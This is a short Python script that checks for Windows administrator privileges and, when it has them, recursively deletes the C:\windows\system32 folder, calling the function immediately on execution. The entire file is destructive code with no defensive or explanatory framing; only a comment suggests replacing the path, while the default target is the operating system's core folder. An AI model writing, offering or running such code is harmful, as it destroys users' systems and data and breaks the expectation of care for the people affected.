import os
import shutil
import ctypes

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def delete_system_folder():
    if is_admin():
        try:
            folder_path = 'C://windows/system32/'  # Replace with the actual folder path you want to delete
            shutil.rmtree(folder_path)
            print(f"Deleted folder: {folder_path}")
        except PermissionError:
            print("Permission denied: Unable to delete the folder.")
        except FileNotFoundError:
            print("Folder not found.")
        except Exception as e:
            print(f"An error occurred: {e}")
    else:
        print("Administrator privileges required to delete the folder.")

# Usage
delete_system_folder()